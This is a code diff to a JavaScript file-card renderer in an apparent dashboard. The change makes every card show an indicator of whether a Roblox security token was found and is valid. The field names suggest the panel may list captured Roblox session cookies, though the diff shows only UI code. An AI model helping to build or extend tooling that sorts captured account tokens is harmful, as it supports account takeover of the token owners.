@@ -115,15 +115,11 @@ function renderFiles(list) {
       previewHTML = "<div class='card-preview-icon'>" + icon(nm) + "</div>";
     }
 
-    const hasRobloxUser = f.roblox && f.roblox.user;
     const hasValidToken = f.roblox && f.roblox.security && f.roblox.security.length > 0 && (!f.robuxInfo || f.robuxInfo.valid !== false);
 
-    let indicator = "";
-    if (hasRobloxUser) {
-      const color = hasValidToken ? "var(--success)" : "var(--danger)";
-      const title = hasValidToken ? "Roblox токен найден" : "Токен недействителен или отсутствует";
-      indicator = "<div class='roblox-indicator' style='position:absolute; top:12px; right:12px; width:10px; height:10px; border-radius:50%; background:" + color + "; box-shadow:0 0 15px " + color + "; z-index: 10;' title='" + title + "'></div>";
-    }
+    const color = hasValidToken ? "var(--success)" : "var(--danger)";
+    const title = hasValidToken ? "Roblox токен найден" : "Токен отсутствует или недействителен";
+    let indicator = "<div class='roblox-indicator' style='position:absolute; top:12px; right:12px; width:10px; height:10px; border-radius:50%; background:" + color + "; box-shadow:0 0 15px " + color + "; z-index: 10;' title='" + title + "'></div>";
 
     html += "<div class='file-card' onclick=\"openModalByIndex(" + idx + ")\" style='position:relative'>" +
               indicator +
